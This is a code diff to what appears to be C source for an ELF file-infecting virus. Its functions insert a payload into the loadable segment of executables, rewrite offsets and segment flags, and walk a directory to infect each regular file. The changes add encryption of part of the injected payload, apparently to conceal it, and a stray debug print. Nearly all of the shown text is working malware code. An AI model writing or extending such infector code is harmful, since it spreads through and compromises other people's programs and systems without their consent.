@@ -73,7 +73,7 @@ void update(char *b, size_t n, size_t old_entry, size_t entry){
 	encrypt((char*)(p+7), 8, (uint32_t*)KEY);
 }
 
-static int _infect(char **s, size_t *n, char *b, size_t bn){
+static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len){
 	Elf64_Ehdr *h = (void*)*s;
 	Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;
 
@@ -94,6 +94,7 @@ static int _infect(char **s, size_t *n, char *b, size_t bn){
 	}
 	size_t pos = ph[x].p_offset + ph[x].p_filesz;
 	_insert(s, n, pos, b, bn);
+	encrypt(((*s) + pos + 1 + crypt_off), crypt_len, (uint32_t*)KEY);
 	//reset it
 	elf_shift_offset(*s, *n, pos, bn);
 	elf_update_flags_of_load_segments(*s, *n);
@@ -133,8 +134,9 @@ char *debug_name(char *fname){
 	return s;
 }
 
-int infect(char *fname, char *b, size_t bn, int force){
+int infect(char *fname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, int force){
 	char *s; size_t n;
+			println("OK");
 	if (!fget(fname, &s, &n))
 		return fail("failed to open the file");
 	if (elf_check_valid(s, n) == FALSE) return FALSE;
@@ -150,7 +152,7 @@ int infect(char *fname, char *b, size_t bn, int force){
 
 #define LIM 1024
 
-int infect_dir(char *dirname, char *b, size_t bn){
+int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len){
 	struct linux_dirent *d;
 	char		*p;
 	char		tmp[LIM];
@@ -163,7 +165,7 @@ int infect_dir(char *dirname, char *b, size_t bn){
 		if (d_isfile(d)){
 			add_base((char *)tmp, dirname, d->d_name, LIM);
 			print(">>>>: ");println(tmp);
-			infect(tmp, b, bn, FALSE);
+			infect(tmp, b, bn, crypt_off, crypt_len, FALSE);
 		}
 		x += d->d_reclen;
 	}
